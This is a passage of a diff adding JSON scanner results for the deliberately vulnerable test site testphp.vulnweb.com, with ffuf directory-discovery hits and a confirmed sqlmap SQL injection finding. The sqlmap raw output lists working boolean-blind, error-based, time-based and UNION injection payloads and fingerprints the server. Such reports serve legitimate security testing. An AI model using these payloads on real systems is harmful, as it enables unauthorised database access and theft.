+          "FUZZ": "CVS"
+        },
+        "position": 6261,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/CVS/",
+        "scraper": {},
+        "duration": 273123383,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/CVS",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e01875",
+          "FUZZ": "CVS"
+        },
+        "position": 6261,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/CVS/",
+        "scraper": {},
+        "duration": 273123383,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/CVS",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/AJAX",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e020dc",
+          "FUZZ": "AJAX"
+        },
+        "position": 8412,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/AJAX/",
+        "scraper": {},
+        "duration": 267236733,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/AJAX",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e020dc",
+          "FUZZ": "AJAX"
+        },
+        "position": 8412,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/AJAX/",
+        "scraper": {},
+        "duration": 267236733,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/AJAX",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "ffuf",
+      "url": "http://testphp.vulnweb.com/secured",
+      "finding_name": "Hidden Resource Discovered",
+      "severity": "INFO",
+      "risk_score": 1,
+      "category": "discovery",
+      "description": "Status: 301 | Size: 169",
+      "timestamp": "2026-02-20 03:22:50",
+      "raw_output": {
+        "input": {
+          "FFUFHASH": "677e038c1",
+          "FUZZ": "secured"
+        },
+        "position": 14529,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/secured/",
+        "scraper": {},
+        "duration": 275715090,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/secured",
+        "host": "testphp.vulnweb.com"
+      },
+      "type": "discovery",
+      "source": "ffuf",
+      "raw": {
+        "input": {
+          "FFUFHASH": "677e038c1",
+          "FUZZ": "secured"
+        },
+        "position": 14529,
+        "status": 301,
+        "length": 169,
+        "words": 5,
+        "lines": 8,
+        "content-type": "text/html",
+        "redirectlocation": "http://testphp.vulnweb.com/secured/",
+        "scraper": {},
+        "duration": 275715090,
+        "resultfile": "",
+        "url": "http://testphp.vulnweb.com/secured",
+        "host": "testphp.vulnweb.com"
+      }
+    },
+    {
+      "tool": "sqlmap",
+      "url": "http://testphp.vulnweb.com/listproducts.php?cat=4",
+      "finding_name": "SQL Injection Confirmed",
+      "severity": "CRITICAL",
+      "risk_score": 10,
+      "category": "general",
+      "description": "Vulnerable Parameter: cat | Backend DBMS: MySQL >= 5.6 | Tested Parameters: cat | HTTP Method: GET | Revalidation: passed | SQLMap confirmed injectable parameter.",
+      "timestamp": "2026-02-20 03:29:28",
+      "raw_output": "___\n       __H__\n ___ ___[']_____ ___ ___  {1.9.11#stable}\n|_ -| . [']     | .'| . |\n|___|_  [']_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 03:28:01 /2026-02-20/\n\n[03:28:01] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[03:28:02] [INFO] flushing session file\n[03:28:02] [INFO] testing connection to the target URL\n[03:28:02] [INFO] checking if the target is protected by some kind of WAF/IPS\n[03:28:02] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS\nare you sure that you want to continue with further target testing? [Y/n] Y\n[03:28:02] [WARNING] please consider usage of tamper scripts (option '--tamper')\n[03:28:02] [INFO] testing if the target URL content is stable\n[03:28:03] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'\nhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C\n[03:28:03] [INFO] searching for dynamic content\n[03:28:03] [CRITICAL] target URL content appears to be heavily dynamic. sqlmap is going to retry the request(s)\n[03:28:05] [INFO] testing if GET parameter 'cat' is dynamic\n[03:28:05] [WARNING] GET parameter 'cat' does not appear to be dynamic\n[03:28:05] [INFO] testing for SQL injection on GET parameter 'cat'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y\n[03:28:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[03:28:06] [WARNING] reflective value(s) found and filtering out\n[03:28:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[03:28:19] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable \n[03:28:19] [INFO] testing 'Generic inline queries'\n[03:28:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[03:28:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[03:28:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[03:28:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[03:28:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[03:28:21] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable \n[03:28:21] [INFO] testing 'MySQL inline queries'\n[03:28:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[03:28:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[03:28:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[03:28:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[03:28:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'\n[03:28:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'\n[03:28:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[03:28:35] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[03:28:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[03:28:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[03:28:42] [INFO] target URL appears to be UNION injectable with 11 columns\n[03:28:44] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: cat=4 AND 3934=(SELECT (CASE WHEN (3934=3934) THEN 3934 ELSE (SELECT 9092 UNION SELECT 1817) END))-- -\n\n    Type: error-based\n    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\n    Payload: cat=4 AND GTID_SUBSET(CONCAT(0x716a716a71,(SELECT (ELT(9035=9035,1))),0x717a707871),9035)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: cat=4 AND (SELECT 8191 FROM (SELECT(SLEEP(5)))ZxLL)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=4 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a716a71,0x4e54536e59534e47797869504b56546268555762747470465873486b556d6d4d6c43445446626e41,0x717a707871),NULL,NULL-- -\n---\n[03:28:44] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.19.0, PHP 5.6.40\nback-end DBMS: MySQL >= 5.6\n[03:28:47] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'\n\n[*] ending @ 03:28:47 /2026-02-20/\n\n=== REVALIDATION ===\n___\n       __H__\n ___ ___[)]_____ ___ ___  {1.9.11#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [,]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 03:28:48 /2026-02-20/\n\n[03:28:48] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 OPR/120.0.0.0' from file '/usr/share/sqlmap/data/txt/user-agents.txt'\n[03:28:48] [INFO] flushing session file\n[03:28:48] [INFO] testing connection to the target URL\n[03:28:49] [INFO] checking if the target is protected by some kind of WAF/IPS\n[03:28:49] [INFO] testing if the target URL content is stable\n[03:28:49] [INFO] target URL content is stable\n[03:28:49] [INFO] testing if GET parameter 'cat' is dynamic\n[03:28:49] [WARNING] GET parameter 'cat' does not appear to be dynamic\n[03:28:50] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')\n[03:28:50] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks\n[03:28:50] [INFO] testing for SQL injection on GET parameter 'cat'\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y\nfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] Y\n[03:28:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[03:28:50] [WARNING] reflective value(s) found and filtering out\n[03:28:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n[03:29:01] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --string=\"Our\")\n[03:29:01] [INFO] testing 'Generic inline queries'\n[03:29:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[03:29:02] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'\n[03:29:02] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'\n[03:29:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n[03:29:03] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'\n[03:29:04] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'\n[03:29:04] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'\n[03:29:04] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'\n[03:29:05] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[03:29:05] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n[03:29:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[03:29:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'\n[03:29:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'\n[03:29:07] [INFO] GET parameter 'cat' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable \n[03:29:07] [INFO] testing 'MySQL inline queries'\n[03:29:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'\n[03:29:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'\n[03:29:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'\n[03:29:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'\n[03:29:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'\n[03:29:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'\n[03:29:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'\n[03:29:20] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable \n[03:29:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'\n[03:29:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found\n[03:29:21] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test\n[03:29:23] [INFO] target URL appears to have 11 columns in query\n[03:29:25] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable\nGET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N\nsqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:\n---\nParameter: cat (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: cat=4 AND 5955=(SELECT (CASE WHEN (5955=5955) THEN 5955 ELSE (SELECT 5868 UNION SELECT 1869) END))-- -\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)\n    Payload: cat=4 AND UPDATEXML(9204,CONCAT(0x2e,0x716a627871,(SELECT (ELT(9204=9204,1))),0x7162706271),6048)\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: cat=4 AND (SELECT 7993 FROM (SELECT(SLEEP(5)))NuZt)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 11 columns\n    Payload: cat=4 UNION ALL SELECT CONCAT(0x716a627871,0x62554f6f4b78656e52526f53674a7953616862786f6a7259616b6c4668534f6e734d537844654661,0x7162706271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\n---\n[03:29:25] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: PHP 5.6.40, Nginx 1.19.0\nback-end DBMS: MySQL >= 5.1\n[03:29:28] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'\n\n[*] ending @ 03:29:28 /2026-02-20/",
+      "type": "vulnerability",
+      "source": "sqlmap"
+    }
+  ]
+}
